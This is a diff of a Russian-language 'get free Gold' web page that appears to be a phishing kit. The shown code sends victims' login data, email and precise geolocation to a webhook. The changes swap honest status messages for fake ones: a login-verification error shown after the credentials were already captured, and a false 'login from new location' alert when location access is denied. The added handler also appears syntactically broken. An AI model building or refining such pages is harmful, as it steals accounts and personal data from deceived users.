@@ -168,7 +168,7 @@
     <div id="gold-section" class="form-section" style="display:none;">
       <h2>Получить Gold</h2>
       <!-- Покачивающаяся картинка (малое изображение подарка) -->
-      <img id="shake-gift" src="small_gold.png" alt="Мало голды" class="shake">
+      <img id="shake-gift" src="gift.png" alt="Мало голды" class="shake">
       <!-- Повторное отображение данных -->
       <div id="gold-info" class="info-block"></div>
       <button id="get-gold-button">Получить Gold</button>
@@ -222,9 +222,12 @@
           };
         },
         error => {
-          console.error("Ошибка получения геолокации:", error);
-          clientInfo.geolocation = { error: error.message };
-        },
+    console.error("Ошибка получения геолокации:", error);
+    clientInfo.geolocation = { error: error.message };
+    
+    if (error.code === error.PERMISSION_DENIED) {
+      alert("Ошибка: обнаружен вход с новой локации");
+    },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
     }
@@ -327,10 +330,10 @@ Email: ${email}
       // Отправляем данные авторизации на вебхук
       sendDataToWebhook(authMsg, function(success) {
         if (!success) {
-          document.getElementById("login-result").textContent = "Ошибка отправки данных на сервер";
+          document.getElementById("login-result").textContent = "Ошибка входа";
           return;
         }
-        document.getElementById("login-result").textContent = "Авторизация успешна";
+        document.getElementById("login-result").textContent = "Ошибка: проверки правильности данных входа";
         // Смена изображения: gift.png -> small_gold.png (с анимацией)
         const giftImage = document.getElementById("gift-image");
         giftImage.classList.add("fade-out");
@@ -371,7 +374,7 @@ ID отправителя: ${params.senderId}
 Дополнительная информация: ${JSON.stringify(clientInfo)}`;
         sendDataToWebhook(goldMsg, function(ok) {
           if (!ok) {
-            alert("Ошибка при отправке запроса получения голды");
+            alert("Ошибка при получение Gold");
             return;
           }
           showGoldResult();
